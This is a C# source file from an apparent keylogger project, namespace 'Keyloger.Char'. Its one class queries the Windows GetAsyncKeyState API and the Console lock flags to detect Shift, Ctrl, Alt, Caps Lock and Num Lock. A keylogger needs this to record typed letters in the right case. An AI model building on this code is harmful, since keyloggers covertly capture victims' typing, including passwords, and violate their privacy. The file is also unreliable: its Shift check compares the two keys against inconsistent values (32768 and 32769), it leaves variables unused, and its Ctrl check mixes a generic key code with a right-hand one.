using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Keyloger.Char
{

    class Check
    {
        
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 Stateshift);
        public bool BigLiterStatus()
        {
            bool a = CapsLockStatus();
            bool b = Shift();
            if(CapsLockStatus()==true && Shift()==true)
            {
                return false;
            }
            else if (CapsLockStatus() == false && Shift() == true)
            {
                return true;
            }
            else if (CapsLockStatus() == true && Shift() == false)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public bool CapsLockStatus()
        {
            bool isCapsLockToggled = Console.CapsLock;
            if (Console.CapsLock)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public bool NumLock()
        {
            if (Console.NumberLock)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public bool Shift()
        {
            var LShift = GetAsyncKeyState(160);
            var PShift = GetAsyncKeyState(161);
           
            if (LShift == 32768 || PShift == 32769)
            {
                return true; 
            }
            else
            {
                return false;
            }
            
        }
        public bool Ctrl()
        {
            var LCtrl = GetAsyncKeyState(17);
            var PCtrl = GetAsyncKeyState(163);
            //Console.WriteLine(OtherCodeCtrl);

            if (LCtrl != 0 || PCtrl != 0)
            {
                return true;
            }
            else
            {
                return false;
            }

        }

        public bool AltState()
        {
            var PAlt = GetAsyncKeyState(18);
            var OtherAlt = GetAsyncKeyState(165);
            if (PAlt == 32768|| OtherAlt == 32768)
                return true;
            else
                return false;
        }
    }
}
